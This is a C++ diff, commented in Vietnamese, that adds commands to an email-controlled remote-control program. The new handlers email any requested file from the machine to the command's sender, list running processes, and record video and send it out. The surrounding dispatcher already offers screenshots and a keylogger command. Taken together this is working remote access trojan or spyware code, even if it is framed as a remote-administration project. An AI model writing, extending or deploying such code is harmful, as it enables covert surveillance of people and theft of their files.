@@ -67,7 +67,61 @@ void handle_get_screenshot() {
 }
 
 void handle_list_programs() {
-  list_programs();  // tự gửi mail
+  list_programs();  // tự gửi mail với danh sách programs
+}
+
+void handle_list_processes() {
+  list_processes();  // tự gửi mail với danh sách processes
+}
+
+void handle_send_file(const string& command) {
+  string filepath = command.substr(9);  // After "send_file"
+  filepath.erase(filepath.begin(),
+                 find_if(filepath.begin(), filepath.end(),
+                         [](int ch) { return !isspace(ch); }));
+
+  if (!filepath.empty()) {
+    cout << "Sending file: " << filepath << endl;
+
+    // Kiểm tra file có tồn tại không
+    ifstream file_check(filepath);
+    if (!file_check.good()) {
+      cerr << "File not found: " << filepath << endl;
+      if (!g_current_sender.empty()) {
+        send_email_with_attachment(g_current_sender, "send_file failed",
+                                   "File not found: " + filepath, "");
+      }
+      return;
+    }
+    file_check.close();
+
+    // Gửi file qua email
+    if (!g_current_sender.empty()) {
+      send_email_with_attachment(g_current_sender, "File from remote computer",
+                                 "Requested file: " + filepath, filepath);
+    }
+  } else if (!g_current_sender.empty()) {
+    send_email_with_attachment(g_current_sender, "send_file",
+                               "No file path specified.", "");
+  }
+}
+
+void handle_start_recording() {
+  cout << "Starting video recording..." << endl;
+  start_recording();
+  if (!g_current_sender.empty()) {
+    send_email_with_attachment(g_current_sender, "start_recording",
+                               "Video recording started", "");
+  }
+}
+
+void handle_stop_recording() {
+  cout << "Stopping video recording and sending..." << endl;
+  stop_and_send_recording();
+  if (!g_current_sender.empty()) {
+    send_email_with_attachment(g_current_sender, "stop_recording",
+                               "Video recording stopped and sent", "");
+  }
 }
 
 void handle_shutdown() {
@@ -117,6 +171,14 @@ void execute_command(const string& command) {
     handle_get_screenshot();
   } else if (trimmed_cmd.find("list_program") == 0) {
     handle_list_programs();
+  } else if (trimmed_cmd.find("list_process") == 0) {
+    handle_list_processes();
+  } else if (trimmed_cmd.find("send_file") == 0) {
+    handle_send_file(trimmed_cmd);
+  } else if (trimmed_cmd.find("start_recording") == 0) {
+    handle_start_recording();
+  } else if (trimmed_cmd.find("stop_recording") == 0) {
+    handle_stop_recording();
   } else if (trimmed_cmd.find("shutdown") == 0) {
     handle_shutdown();
   } else if (trimmed_cmd.find("keylogger") == 0) {
